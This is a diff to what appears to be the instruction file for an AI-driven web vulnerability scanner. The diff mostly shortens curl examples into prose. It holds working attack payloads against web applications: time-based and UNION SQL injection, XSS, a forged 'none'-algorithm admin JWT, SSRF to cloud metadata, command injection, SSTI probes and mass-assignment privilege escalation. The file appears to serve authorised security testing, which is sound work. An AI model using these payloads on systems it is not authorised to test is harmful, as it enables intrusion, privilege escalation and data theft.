@@ -86,21 +86,26 @@ VULCHK_COOKIE_JAR="${VULCHK_WORKSPACE}/cookies-<phase>.txt"
 
 Always propagate captured session state (cookies + token) to every subsequent request.
 
+## Error Handling
+
+Apply these strategies throughout all testing phases:
+
+- **429 Too Many Requests**: Pause for 30 seconds, then resume with reduced request rate
+- **5xx Server Error**: Log the error, skip this test case, continue to next. Do NOT retry more than once
+- **403 Forbidden**: Likely WAF or IP block. Log as "WAF_DETECTED", skip aggressive payloads for this endpoint
+- **Connection timeout**: Log and move to next endpoint. Do not retry
+- **Network error**: Report in findings as "TARGET_UNREACHABLE" and stop testing
+
 ### Step 2: Execute Passive Reconnaissance Tests
 
 **Only execute this step if `phase == passive`.** For other phases, skip to
 the test sections in Step 3 or Step 4 that correspond to your phase's scenarios.
 
-These passive tests run once per scan. Duplicate execution from non-passive
-executor instances wastes time and produces redundant findings.
+If `site-analysis.md` exists in the workspace (produced by attack-planner), read it first and reuse existing header/CORS/TLS analysis data. Only perform additional passive checks not already covered in `site-analysis.md`.
 
 #### 2a. Security Header Audit
 
-```bash
-curl -sI --max-time 10 "{target_url}" 2>/dev/null
-```
-
-Check for presence and correct configuration of:
+Fetch response headers and check for presence and correct configuration of:
 
 | Header | Expected | Severity if Missing |
 |---|---|---|
@@ -115,27 +120,18 @@ Check for presence and correct configuration of:
 
 #### CSP Quality Analysis
 
-Do NOT just check if `Content-Security-Policy` header exists. Analyze its
-directives for weaknesses:
+Do NOT just check if `Content-Security-Policy` header exists. Parse the CSP value and analyze directives for weaknesses:
 
-| CSP Directive Issue | Severity | Why It Matters |
-|---|---|---|
-| `unsafe-inline` in `script-src` | High | Allows inline `<script>` — defeats CSP purpose |
-| `unsafe-eval` in `script-src` | High | Allows `eval()` — enables XSS exploitation |
-| `*` wildcard in `script-src` | Critical | Allows scripts from ANY domain |
-| `data:` in `script-src` | High | Allows `<script src="data:...">` injection |
-| `http:` scheme allowed | Medium | Mixed content, MitM script injection |
-| Missing `default-src` | Medium | No fallback policy for unlisted resource types |
-| Missing `frame-ancestors` | Medium | Clickjacking possible (unless X-Frame-Options set) |
-| `unsafe-inline` in `style-src` | Low | CSS injection possible but lower impact |
-| Overly broad domain (`*.example.com`) | Low | Subdomain takeover could bypass CSP |
-| Missing `upgrade-insecure-requests` | Low | HTTP resources not auto-upgraded |
-
-Parse the CSP header value and check each directive:
-```bash
-CSP=$(curl -sI --max-time 10 "{target_url}" 2>/dev/null | grep -i "content-security-policy" | cut -d: -f2-)
-echo "$CSP" | tr ';' '\n'
-```
+| CSP Directive Issue | Severity |
+|---|---|
+| `unsafe-inline` in `script-src` | High |
+| `unsafe-eval` in `script-src` | High |
+| `*` wildcard in `script-src` | Critical |
+| `data:` in `script-src` | High |
+| `http:` scheme allowed | Medium |
+| Missing `default-src` | Medium |
+| Missing `frame-ancestors` | Medium |
+| `unsafe-inline` in `style-src` | Low |
 
 Rate the CSP strength:
 - **Strong**: No `unsafe-inline`/`unsafe-eval`, specific domains, `default-src 'none'` or `'self'`
@@ -143,15 +139,9 @@ Rate the CSP strength:
 - **Weak**: Uses wildcards, `unsafe-eval`, or `data:` in script-src
 - **None**: No CSP header present
 
-Log each header check as a test in the attack log.
-
 #### 2b. Cookie Security Check
 
-```bash
-curl -sI --max-time 10 "{target_url}" 2>/dev/null | grep -i "set-cookie"
-```
-
-For each cookie, check:
+For each cookie in the response, check:
 - `HttpOnly` flag present
 - `Secure` flag present
 - `SameSite` attribute set (Strict or Lax)
@@ -159,37 +149,18 @@ For each cookie, check:
 
 #### 2c. CORS Policy Test
 
-```bash
-curl -sI --max-time 10 -H "Origin: https://evil-test-vulchk.com" "{target_url}" 2>/dev/null | grep -i "access-control"
-```
+Send a request with `Origin: https://evil-test-vulchk.com` header.
 
 Vulnerable if:
-- `Access-Control-Allow-Origin: https://evil-test-vulchk.com` (reflects arbitrary origin)
+- `Access-Control-Allow-Origin` reflects the arbitrary origin
 - `Access-Control-Allow-Credentials: true` with reflected origin
 - `Access-Control-Allow-Origin: *` with credential-bearing endpoints
 
 #### 2d. Information Disclosure
 
-```bash
-# robots.txt
-curl -s --max-time 5 "{target_url}/robots.txt" 2>/dev/null
-
-# Common sensitive paths
-curl -sI --max-time 5 "{target_url}/.git/HEAD" 2>/dev/null | head -3
-curl -sI --max-time 5 "{target_url}/.env" 2>/dev/null | head -3
-curl -sI --max-time 5 "{target_url}/wp-admin/" 2>/dev/null | head -3
-curl -sI --max-time 5 "{target_url}/admin/" 2>/dev/null | head -3
-curl -sI --max-time 5 "{target_url}/server-status" 2>/dev/null | head -3
-curl -sI --max-time 5 "{target_url}/phpinfo.php" 2>/dev/null | head -3
-```
-
-Report any 200 responses to sensitive paths.
+Probe common sensitive paths: `/robots.txt`, `/.git/HEAD`, `/.env`, `/wp-admin/`, `/admin/`, `/server-status`, `/phpinfo.php`. Report any 200 responses.
 
 #### 2e. TLS/SSL Analysis
-
-```bash
-curl -sv --max-time 10 "{target_url}" 2>&1 | grep -iE "SSL connection|TLSv|cipher|certificate|expire|subject"
-```
 
 Check for:
 - TLS version (1.2+ required, 1.3 recommended)
@@ -198,15 +169,7 @@ Check for:
 
 #### 2f. Error Page Analysis
 
-```bash
-curl -s --max-time 5 "{target_url}/vulchk-nonexistent-test-path" 2>/dev/null | head -30
-```
-
-Check if error responses leak:
-- Stack traces
-- Framework versions
-- File paths
-- Database information
+Request a nonexistent path and check if error responses leak stack traces, framework versions, file paths, or database information.
 
 **If intensity is passive, STOP HERE and go to Step 5.**
 
@@ -216,41 +179,25 @@ Only execute if intensity is `active` or `aggressive`.
 
 #### 3a. XSS Reflection Testing
 
-For each input field or URL parameter identified in the attack plan:
+Test for reflected XSS by injecting probe payloads into all user-input fields and URL parameters.
 
-```bash
-# Basic reflection test
-curl -s --max-time 10 "{target_url}/{path}?{param}=vulchk-xss-probe-12345" 2>/dev/null | grep -c "vulchk-xss-probe-12345"
+**Detection**: Inject a unique probe string (e.g., `vulchk-xss-probe-12345`). If reflected, escalate to HTML tag injection (`<vulchk-tag>`), then script context (`"><img src=x onerror=vulchkprobe>`). If unescaped probe appears in the response, XSS is confirmed.
 
-# If reflected, test HTML context escaping
-curl -s --max-time 10 "{target_url}/{path}?{param}=<vulchk-tag>" 2>/dev/null | grep -c "<vulchk-tag>"
+**Severity**: HIGH (stored XSS: CRITICAL)
 
-# If HTML tag is reflected, test script execution context
-curl -s --max-time 10 "{target_url}/{path}?{param}=\"><img src=x onerror=vulchkprobe>" 2>/dev/null | grep -c "onerror=vulchkprobe"
-```
-
-If ratatosk available, also test via browser:
-```
-Navigate to {target_url}/{path}
-Fill form field with: <img src=x onerror="window.vulchkXssProbe=true">
-Submit form
-Check: browser_eval_js("window.vulchkXssProbe === true")
-Screenshot for evidence if XSS confirmed
-```
+If ratatosk available, also verify via browser to confirm actual script execution and capture screenshot evidence.
 
 #### 3b. SQL Injection Testing
 
 For each data-accepting endpoint:
 
+**Error-based detection**: Append a single quote `'` to parameter values and check response for SQL error keywords (`sql`, `syntax`, `mysql`, `ora-`, `postgresql`, `sqlite`, `microsoft`).
+
+**Boolean-based detection**: Compare response sizes between `1 AND 1=1` and `1 AND 1=2`. Significant difference indicates SQLi.
+
+**Time-based detection** (baseline-delta method):
+
 ```bash
-# Error-based detection
-curl -s --max-time 10 "{target_url}/{path}?{param}=1'" 2>/dev/null | grep -icE "sql|syntax|mysql|ora-|postgresql|sqlite|microsoft"
-
-# Boolean-based detection
-RESP_TRUE=$(curl -s --max-time 10 "{target_url}/{path}?{param}=1 AND 1=1" 2>/dev/null | wc -c)
-RESP_FALSE=$(curl -s --max-time 10 "{target_url}/{path}?{param}=1 AND 1=2" 2>/dev/null | wc -c)
-# Significant difference in response size indicates SQLi
-
 # Baseline latency measurement (must run FIRST — all thresholds are delta-based)
 BASELINE_START=$(date +%s)
 curl -s --max-time 12 "{target_url}/{path}?{param}=1" 2>/dev/null >/dev/null
@@ -265,53 +212,33 @@ END=$(date +%s); ELAPSED=$((END-START))
 echo "MySQL SLEEP: ${ELAPSED}s (baseline: ${BASELINE}s)"
 if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: MySQL/MariaDB time-based SQLi"; fi
 
-# MSSQL — single-quotes percent-encoded to survive URL parsers
+# MSSQL — WAITFOR DELAY (single-quotes percent-encoded to survive URL parsers)
 START=$(date +%s)
 curl -s --max-time 12 "{target_url}/{path}?{param}=1%3B+WAITFOR+DELAY+%270%3A0%3A5%27--" 2>/dev/null >/dev/null
 END=$(date +%s); ELAPSED=$((END-START))
-echo "MSSQL WAITFOR DELAY: ${ELAPSED}s"
 if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: MSSQL time-based SQLi"; fi
 
-# PostgreSQL — single-statement form (compatible with all pg drivers, avoids stacked query restriction)
+# PostgreSQL — single-statement form (compatible with all pg drivers)
 START=$(date +%s)
 curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+1%3D(SELECT+1+FROM+pg_sleep(5))" 2>/dev/null >/dev/null
 END=$(date +%s); ELAPSED=$((END-START))
-echo "PostgreSQL pg_sleep: ${ELAPSED}s"
 if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: PostgreSQL time-based SQLi"; fi
 
-# SQLite — CPU-bound (5MB — reduced from 50MB to limit DoS risk on constrained servers)
+# SQLite — CPU-bound (5MB — reduced from 50MB to limit DoS risk)
 # WARNING: inherently unreliable on modern hardware; if inconclusive, confirm with boolean test
 START=$(date +%s)
 curl -s --max-time 12 "{target_url}/{path}?{param}=1+AND+(SELECT+HEX(RANDOMBLOB(5000000)))!=''" 2>/dev/null >/dev/null
 END=$(date +%s); ELAPSED=$((END-START))
-echo "SQLite RANDOMBLOB: ${ELAPSED}s"
 if [ $((ELAPSED - BASELINE)) -ge 5 ]; then echo "CONFIRMED: SQLite time-based SQLi (verify with boolean test)"; fi
 ```
 
-For POST endpoints:
-```bash
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/json" \
-  -d '{"{param}": "1'\''"}' 2>/dev/null | grep -icE "sql|syntax|error"
-```
+**Severity**: CRITICAL
 
 #### 3c. CSRF Token Validation
 
-For each state-changing endpoint (POST/PUT/DELETE):
+For each state-changing endpoint (POST/PUT/DELETE), check for CSRF token in forms and verify SameSite cookie attribute. Test if the request succeeds without a CSRF token or with an invalid one. If it does, report as vulnerable.
 
-```bash
-# Test without CSRF token
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "{param}=test_value" 2>/dev/null | head -20
-
-# Test with invalid CSRF token
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "{param}=test_value&csrf_token=invalid_token_vulchk" 2>/dev/null | head -20
-```
-
-If the request succeeds without or with an invalid CSRF token, report as vulnerable.
+**Severity**: MEDIUM–HIGH
 
 #### 3d. Authentication Testing (Stateful)
 
@@ -321,12 +248,7 @@ the application properly enforces access control across a sequence of requests.
 **Phase 1: Unauthenticated Access**
 
 Read `site-analysis.md` API Structure table. For each endpoint marked
-"Auth Required: yes", probe it WITHOUT authentication:
-
-```bash
-curl -s --max-time 10 \
-  "{target_url}/{protected_endpoint_from_site_analysis}" 2>/dev/null
-```
+"Auth Required: yes", probe it WITHOUT authentication.
 
 **Phase 2: Login and Session Capture**
 ```bash
@@ -357,18 +279,8 @@ curl -s --max-time 10 \
 If login succeeds (session/JWT captured), immediately test privilege boundaries.
 Use endpoints from `site-analysis.md`, not guessed paths:
 
-```bash
-AUTH="-H \"Authorization: Bearer $(cat ${VULCHK_WORKSPACE}/jwt.txt 2>/dev/null)\""
-
-# Re-test admin/privileged endpoints from site-analysis.md WITH captured session
-curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
-  $AUTH "{target_url}/{admin_or_privileged_endpoint}" 2>/dev/null
-
-# Horizontal privilege escalation: use YOUR session to access OTHER users' resources
-# Note the ID of your own resource first, then try adjacent IDs
-curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
-  $AUTH "{target_url}/{resource_endpoint}/{adjacent_user_id}" 2>/dev/null
-```
+- Re-test admin/privileged endpoints WITH captured session
+- Horizontal privilege escalation: use YOUR session to access OTHER users' resources (adjacent IDs)
 
 **Phase 4: Session Invalidation Check**
 ```bash
@@ -383,124 +295,32 @@ curl -s --max-time 10 -b "$VULCHK_COOKIE_JAR" \
 # If this still returns 200 with data, session invalidation is broken
 ```
 
-If JWT is detected:
-```bash
-# Decode JWT payload (no signature verification needed)
-echo "$JWT_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null
-
-# Test none algorithm
-NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.$(echo "$JWT_TOKEN" | cut -d'.' -f2)."
-curl -s --max-time 10 "{target_url}/api/profile" \
-  -H "Authorization: Bearer $NONE_JWT" 2>/dev/null | head -20
-```
+If JWT is detected, decode payload and test `none` algorithm bypass.
 
 #### 3e. IDOR Testing
 
-For each resource endpoint with an ID parameter from `site-analysis.md`:
-
-1. Make an authenticated request to your own resource — note the resource ID.
-2. Try adjacent IDs (ID±1, ID±2) with your session.
-3. Try with no authentication at all.
-
-```bash
-# Use the resource endpoint and ID pattern from site-analysis.md
-curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
-  -H "Authorization: Bearer $(cat ${VULCHK_WORKSPACE}/jwt.txt 2>/dev/null)" \
-  "{target_url}/{resource_endpoint}/{adjacent_id}" 2>/dev/null
-```
+For each resource endpoint with an ID parameter from `site-analysis.md`: (1) access your own resource, note the ID, (2) try adjacent IDs (ID±1, ID±2) with your session, (3) try with no auth. If other users' data is returned, IDOR is confirmed.
 
 #### 3f. SSRF Probing
 
-For each URL-accepting parameter:
+For each URL-accepting parameter, test with external callback URLs (`https://httpbin.org/get`) and internal addresses (`http://localhost/`). If the server fetches the URL, SSRF is confirmed.
 
-```bash
-# Use a safe callback URL to detect SSRF
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/json" \
-  -d '{"{param}": "https://httpbin.org/get"}' 2>/dev/null | head -30
+#### 3g–3j. Additional Active Tests
 
-# Test for internal access (localhost)
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/json" \
-  -d '{"{param}": "http://localhost/"}' 2>/dev/null | head -30
-```
-
-#### 3g. HTTP Method Testing
-
-```bash
-# Check allowed methods
-curl -sI --max-time 5 -X OPTIONS "{target_url}/api/{endpoint}" 2>/dev/null | grep -i "allow"
-
-# Test TRACE (XST risk)
-curl -sI --max-time 5 -X TRACE "{target_url}" 2>/dev/null | head -10
-```
-
-#### 3h. Session Management
-
-```bash
-# Check if session token changes after login
-PRE_SESSION=$(curl -sI --max-time 10 "{target_url}" 2>/dev/null | grep -i "set-cookie" | head -1)
-POST_SESSION=$(curl -sI --max-time 10 -X POST "{target_url}/login" \
-  -d "username=test&password=test" 2>/dev/null | grep -i "set-cookie" | head -1)
-# If same session token before and after login = session fixation
-```
-
-#### 3i. GraphQL Testing (if detected)
-
-```bash
-# Introspection query
-curl -s --max-time 10 -X POST "{target_url}/graphql" \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{__schema{queryType{name}mutationType{name}types{name fields{name type{name}}}}}"}' 2>/dev/null | head -100
-```
-
-#### 3j. File Upload Testing (if upload endpoint exists)
-
-```bash
-# Create a safe test file
-echo "VULCHK_UPLOAD_TEST" > /tmp/vulchk-test.txt
-
-# Test with various content types
-curl -s --max-time 10 -F "file=@/tmp/vulchk-test.txt;type=text/plain" \
-  "{target_url}/{upload_path}" 2>/dev/null | head -20
-
-# Test content-type mismatch
-curl -s --max-time 10 -F "file=@/tmp/vulchk-test.txt;type=image/png;filename=test.php" \
-  "{target_url}/{upload_path}" 2>/dev/null | head -20
-```
-
-Clean up:
-```bash
-rm -f /tmp/vulchk-test.txt
-```
+- **HTTP Methods** (3g): Check allowed methods via OPTIONS. Test TRACE for XST risk.
+- **Session Management** (3h): Check if session token changes after login. Same token = session fixation.
+- **GraphQL** (3i): Test introspection query exposure if GraphQL endpoint detected.
+- **File Upload** (3j): Test content-type mismatch (`.php` with `image/png` type). Clean up test files.
 
 #### 3k. Business Logic Testing
 
 Use the session from 3d. Execute the scenarios from `attack-scenarios.md`
 with `Phase: business-logic`. Do NOT re-test IDOR here — that is covered in 3e.
 
-Focus on value manipulation and workflow integrity:
-
-```bash
-AUTH="-H \"Authorization: Bearer $(cat ${VULCHK_WORKSPACE}/jwt.txt 2>/dev/null)\""
-
-# Price/value manipulation: use the actual checkout/order endpoint from site-analysis.md
-# Try negative price, zero quantity, or out-of-range discount
-curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
-  $AUTH -X POST "{target_url}/{checkout_or_order_endpoint}" \
-  -H "Content-Type: application/json" \
-  -d '{"item_id": 1, "quantity": 1, "price": -1}' 2>/dev/null
-
-# Mass assignment / privilege escalation: inject extra fields in profile/update requests
-curl -s --max-time 10 -c "$VULCHK_COOKIE_JAR" -b "$VULCHK_COOKIE_JAR" \
-  $AUTH -X PUT "{target_url}/{profile_or_update_endpoint}" \
-  -H "Content-Type: application/json" \
-  -d '{"role": "admin", "is_admin": true, "plan": "enterprise"}' 2>/dev/null
-
-# Workflow bypass: attempt to access a later-step endpoint directly
-# (e.g., POST /checkout/confirm without completing /checkout/init)
-# Use the business flow endpoints from site-analysis.md
-```
+Focus on:
+- **Price/value manipulation**: negative price, zero quantity, out-of-range discount
+- **Mass assignment**: inject extra fields (`role`, `is_admin`, `plan`) in profile/update requests
+- **Workflow bypass**: access a later-step endpoint directly without completing prior steps
 
 Report as vulnerability if the server accepts invalid values, skips required
 steps, or elevates privileges without proper validation.
@@ -639,6 +459,33 @@ fi
 - Storage public bucket → **Medium–High**
 - anon key in source (context unclear) → **Low–Medium**
 
+#### 3n. Server-Side Template Injection (SSTI)
+
+Inject template syntax probes into all user-input fields:
+- Universal: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
+- Jinja2/Twig: `{{config}}`, `{{self.__class__}}`
+- EJS: `<%= process.env %>`
+- Pug: `#{7*7}`
+
+**Detection**: If response contains `49` (the computed result) instead of the literal probe string, SSTI is confirmed.
+
+**Severity**: CRITICAL — SSTI typically leads to Remote Code Execution.
+
+Report as: `EXEC-{NNN} | SSTI — {template_engine} injection in {parameter} | CRITICAL`
+
+#### 3o. Rate Limiting Verification
+
+For login endpoints and sensitive API endpoints:
+1. Send 20 identical requests in rapid succession (use a bash for loop)
+2. Check if any response returns 429 or equivalent rate-limit header
+3. If all 20 succeed with 200: rate limiting is ABSENT
+
+**Severity**: MEDIUM (login endpoints: HIGH)
+
+Report as: `EXEC-{NNN} | No rate limiting on {endpoint} | {severity}`
+
+Note: Space requests 100ms apart to avoid being mistaken for a DoS attack.
+
 **If intensity is active, STOP HERE and go to Step 5.**
 
 ### Step 4: Execute Aggressive Exploitation
@@ -648,91 +495,32 @@ exploitation of confirmed or suspected vulnerabilities.
 
 #### 4a. SQL Injection Extraction (if SQLi confirmed in Step 3b)
 
-```bash
-# Determine column count via ORDER BY
-for i in 1 2 3 4 5 6 7 8 9 10; do
-  RESP=$(curl -s --max-time 10 "{target_url}/{path}?{param}=1 ORDER BY $i--" 2>/dev/null)
-  echo "ORDER BY $i: $(echo "$RESP" | wc -c) bytes"
-done
-
-# Extract database version
-curl -s --max-time 10 "{target_url}/{path}?{param}=-1 UNION SELECT NULL,version(),NULL--" 2>/dev/null | head -30
-
-# Extract table names
-curl -s --max-time 10 "{target_url}/{path}?{param}=-1 UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--" 2>/dev/null | head -50
-```
+Determine column count via `ORDER BY` incrementing, then extract database version and table names via `UNION SELECT` from `information_schema.tables`.
 
 IMPORTANT: Do NOT extract actual user data (passwords, personal information).
 Only prove the vulnerability exists by extracting schema metadata.
 
 #### 4b. XSS Exploitation (if XSS confirmed in Step 3a)
 
-Document the full exploit chain but do NOT exfiltrate data:
+Document the full exploit chain but do NOT exfiltrate data. Prove script execution context by injecting `<script>document.title='VULCHK-XSS-CONFIRMED'</script>` and verifying the title change.
 
-```bash
-# Prove script execution context
-curl -s --max-time 10 "{target_url}/{path}?{param}=<script>document.title='VULCHK-XSS-CONFIRMED'</script>" 2>/dev/null | grep "VULCHK-XSS-CONFIRMED"
-```
-
-If ratatosk available:
-```
-Navigate to XSS URL
-Screenshot showing script execution
-Check: browser_eval_js("document.title") returns "VULCHK-XSS-CONFIRMED"
-```
+If ratatosk available, capture screenshot showing script execution.
 
 #### 4c. SSRF Deep Probe (if SSRF confirmed in Step 3f)
 
-```bash
-# Test cloud metadata access
-curl -s --max-time 10 -X POST "{target_url}/{path}" \
-  -H "Content-Type: application/json" \
-  -d '{"{param}": "http://169.254.169.254/latest/meta-data/"}' 2>/dev/null | head -30
-
-# Test internal port scanning (limited range)
-for port in 80 443 3000 5000 8080 8443; do
-  curl -s --max-time 3 -X POST "{target_url}/{path}" \
-    -H "Content-Type: application/json" \
-    -d "{\"${param}\": \"http://127.0.0.1:$port/\"}" 2>/dev/null | head -5
-done
-```
+Test cloud metadata access (`http://169.254.169.254/latest/meta-data/`) and limited internal port scanning (ports 80, 443, 3000, 5000, 8080, 8443).
 
 #### 4d. Command Injection (if suspected from code review)
 
-```bash
-# Time-based detection
-START=$(date +%s)
-curl -s --max-time 15 "{target_url}/{path}?{param}=test;sleep+5" 2>/dev/null
-END=$(date +%s)
-# If elapsed >= 5 seconds, command injection confirmed
-
-# Out-of-band detection
-curl -s --max-time 10 "{target_url}/{path}?{param}=test;curl+https://httpbin.org/get" 2>/dev/null
-```
+Use time-based detection: inject `test;sleep+5` into parameters and measure response time. If elapsed >= 5 seconds vs baseline, command injection is confirmed.
 
 #### 4e. JWT Exploitation (if JWT weaknesses found)
 
-```bash
-# Test with "none" algorithm
-NONE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
-ADMIN_PAYLOAD=$(echo -n '{"sub":"admin","role":"admin","iat":1700000000}' | base64 | tr -d '=' | tr '/+' '_-')
-FORGED_JWT="${NONE_HEADER}.${ADMIN_PAYLOAD}."
-
-curl -s --max-time 10 "{target_url}/api/admin" \
-  -H "Authorization: Bearer $FORGED_JWT" 2>/dev/null | head -30
-```
+Forge a JWT with `{"alg":"none"}` header and `{"sub":"admin","role":"admin"}` payload (base64url-encoded, no signature). Test against protected endpoints. If accepted, report as CRITICAL.
 
 #### 4f. Race Condition Testing
 
-```bash
-# Send multiple concurrent requests to test race conditions
-for i in $(seq 1 5); do
-  curl -s --max-time 10 -X POST "{target_url}/{path}" \
-    -H "Content-Type: application/json" \
-    -d '{test_data}' 2>/dev/null &
-done
-wait
-```
+Send multiple concurrent requests to test race conditions on sensitive endpoints.
 
 ### Step 5: Write Phase Results and Compile
 
@@ -744,51 +532,22 @@ Map phase names to numbers:
 - passive → 1, injection → 2, auth → 3, app-logic → 4
 - business-logic → 5, api → 6, exploitation → 7, advanced → 8, post-exploit → 9
 
+Each finding in the phase results file uses this format:
+
 ```markdown
-# Phase {N}: {Phase Name}
-
-## Findings
-
 ### HSM-{NNN}: {title}
-
 - **Severity**: Critical | High | Medium | Low | Informational
 - **Vector**: browser | http-fetch | api-probe
 - **Endpoint**: {URL/path}
 - **Scenario**: AS-{NNN}
-- **Request**:
-  ```http
-  {method} {path} HTTP/1.1
-  Host: {host}
-  {relevant headers}
-
-  {payload if applicable}
-  ```
-- **Response**:
-  ```
-  HTTP/1.1 {status}
-  {relevant headers}
-
-  {relevant response body excerpt}
-  ```
+- **Request**: ```{method} {path} HTTP/1.1 ...```
+- **Response**: ```HTTP/1.1 {status} ...```
 - **Evidence**: {description of what proves the vulnerability}
 - **References**: CWE-{XXX}, OWASP A{XX}:2021
 - **Remediation**: {specific fix steps}
-
-{repeat for each finding}
-
-## Attack Log
-
-| # | Timestamp | Vector | Endpoint | Payload | Status | Result |
-|---|-----------|--------|----------|---------|--------|--------|
-| 1 | {time} | {vector} | {endpoint} | {payload} | {status} | {result} |
-{...all tests for this phase}
-
-## Phase Summary
-
-- **Tests Executed**: {count}
-- **Findings**: {count} ({breakdown by severity})
-- **Duration**: {elapsed time}
 ```
+
+Include an Attack Log table (`# | Timestamp | Vector | Endpoint | Payload | Status | Result`) and a Phase Summary with tests executed, findings count by severity, and duration.
 
 #### 5b. Write Phase Methodology Entry
 
@@ -825,30 +584,14 @@ Results written to: {workspace}/phases/phase-{N}-{phase}.md
 
 ## Important Notes
 
-- Log EVERY request made to the target — no exceptions
-- Get timestamps via `date +"%Y-%m-%d %H:%M:%S"` before each test group
-- NEVER extract or display actual user data — only prove access is possible
-- ALWAYS redact any credentials, tokens, or secrets found (first 4 + last 4 chars)
-- If the target returns 429 (rate limited) or becomes unresponsive, PAUSE
-  and note it in the log — do NOT retry aggressively
-- If a WAF is detected (403 responses to probes), note it and try to identify
-  the WAF product (Cloudflare, AWS WAF, etc.)
+- Log EVERY request to the target with timestamps via `date +"%Y-%m-%d %H:%M:%S"`
+- NEVER extract actual user data — only prove access is possible
+- ALWAYS redact credentials/tokens/secrets found (show first 4 + last 4 chars only)
+- Keep test payloads non-destructive — use `vulchk-` prefix markers
+- Do NOT perform denial-of-service attacks (thread exhaustion, resource flooding)
 - For browser-based tests, always take a screenshot as evidence
-- Clean up any temporary files created during testing
-- Do NOT perform any denial-of-service type attacks (thread exhaustion,
-  resource flooding, etc.)
-- Keep test payloads non-destructive — use probe markers like "vulchk-" prefix
-  to identify your test data
-- If the attack plan references codeinspector findings, prioritize testing
-  those specific endpoints and patterns first
+- Use stateful session management for ALL tests — chain requests (login → action → verify)
+- If the attack plan references codeinspector findings, prioritize those endpoints first
 - Do NOT delete the workspace directory — files persist for incremental mode
-- Clean up only phase-specific cookie jar copies after the phase completes:
-  ```bash
-  rm -f "${VULCHK_WORKSPACE}/cookies-{phase}.txt"
-  ```
-- Use stateful session management for ALL tests — isolated requests miss
-  authentication and authorization vulnerabilities
-- When testing business logic, chain requests: login → perform action →
-  verify outcome. Do NOT test each request in isolation
-- Always write phase results to `{workspace}/phases/` and update `methodology.json`
+- Clean up only phase-specific cookie jars: `rm -f "${VULCHK_WORKSPACE}/cookies-{phase}.txt"`
 - If a `scenarios_filter` is provided, skip scenarios not in the list
